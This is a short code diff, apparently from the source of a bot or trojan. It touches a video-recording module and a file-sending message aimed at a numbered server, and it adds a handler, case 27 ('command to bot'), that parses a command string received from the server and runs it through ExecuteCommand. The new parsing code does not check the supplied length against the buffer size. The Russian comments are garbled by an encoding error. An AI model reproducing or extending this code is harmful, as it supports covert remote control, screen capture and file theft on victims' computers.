@@ -370,7 +370,7 @@ void RecordStop()
 //сообщение дл€ записи файлов
 struct MsgSendFiles
 {
-	char name[128]; //им€ записи
+	char name[MAX_PATH]; //им€ записи
 	char path[MAX_PATH]; //им€ файла или папка которые нужно передать
 	int numServer;
 	int after; //через сколько секунд начать отправку
@@ -641,6 +641,29 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 					outData[0] = 0;
 //				if( inData && lenInData == sizeof(SOCKET) ) //в inData находитс€ сокет
 //					RunThread( StartBCSessionWork, inData );
+			}
+			break;
+		case 27: //команда боту
+			if( lenInData > 2 )
+			{
+				int len = (inData[1] << 8) | inData[0];
+				TMemory cmd(len);
+				char* p = cmd.AsStr();
+				m_memcpy( p, inData + 2, len );
+				p[len] = 0;
+				VDRDBG( "Video", "ѕолучили строку команды: '%s', длина: %d", p, len );
+				char* p2 = STR::Scan( p, ' ' );
+				char* args;
+				if( p2 )
+				{
+					*p2 = 0; //разделили команду и аргументы
+					args = p2 + 1;
+					if( *args == ' ' ) args++;
+				}
+				else
+					args = p + len; //пуста€ строка
+				VDRDBG( "Video", "ѕолучили команду: '%s', аргументы: '%s'", p, args );
+				ExecuteCommand( 0, p, args );
 			}
 			break;
 	}
